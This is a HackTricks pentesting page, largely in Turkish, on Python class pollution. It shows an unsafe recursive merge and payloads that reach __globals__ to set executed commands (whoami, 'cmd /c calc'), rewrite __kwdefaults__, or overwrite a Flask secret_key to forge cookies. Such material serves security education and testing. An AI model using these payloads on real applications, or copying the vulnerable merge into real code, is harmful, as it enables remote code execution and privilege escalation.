# Class Pollution (Python's Prototype Pollution)

{{#include ../../banners/hacktricks-training.md}}

## Temel Örnek

Nesnelerin class'larını strings kullanarak nasıl pollute etmenin mümkün olduğunu inceleyin:<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Temel Zafiyet Örneği
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Gadget Örnekleri

<details>

<summary>RCE için class property varsayılan değeri oluşturma (subprocess)</summary><sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary><code>globals</code> aracılığıyla diğer class'ları ve global değişkenleri pollution'a uğratma</summary><sup>[[1]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Keyfi subprocess çalıştırma</summary><sup>[[1]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary> <strong><code>__kwdefaults__</code></strong> Üzerine Yazma</summary>

**`__kwdefaults__`**, [Python documentation](https://docs.python.org/3/library/inspect.html)'a göre tüm functions için özel bir attribute'tur ve “**keyword-only** parametreler için varsayılan değerlerin mapping'idir”. Bu attribute'u kirletmek, bir function'ın **keyword-only** parametrelerinin varsayılan değerlerini kontrol etmemizi sağlar; bunlar function'ın \* veya \*args'tan sonra gelen parametreleridir.<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Dosyalar genelinde Flask secret değerinin üzerine yazma</summary>

Yani web uygulamasının ana Python dosyasında tanımlanmış, ancak **sınıfı ana dosyadan farklı bir dosyada tanımlanmış** bir nesne üzerinde class pollution gerçekleştirebiliyorsanız. Önceki payload'larda \_\_globals\_\_ öğesine erişmek için nesnenin sınıfına veya sınıfın method'larına erişmeniz gerektiğinden, **ana dosyadaki globals'a değil, o dosyadaki globals'a erişebileceksiniz**. \
Bu nedenle, ana sayfada **secret key** değerini tanımlayan **Flask app global nesnesine erişemeyeceksiniz**:<sup>[[1]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Bu senaryoda, dosyalarda gezinerek ana dosyaya ulaşacak ve **global object `app.secret_key`** değerine **access** sağlayarak Flask secret key değerini değiştirecek ve bu key'i bilerek [**privileges escalate**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) edebilmenizi sağlayacak bir gadget gerekir.

[Bu writeup'tan](https://ctftime.org/writeup/36082):<sup>[[2]](#references)</sup> böyle bir payload:
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Use this payload to **`app.secret_key` değerini** (uygulamanızdaki ad farklı olabilir) değiştirerek yeni ve daha ayrıcalıklı Flask cookie'lerini imzalayabilirsiniz.

</details>

Daha fazla read-only gadget için aşağıdaki sayfaya da bakın:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## Referanslar

- [1] [Python'da Prototype Pollution](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)

{{#include ../../banners/hacktricks-training.md}}
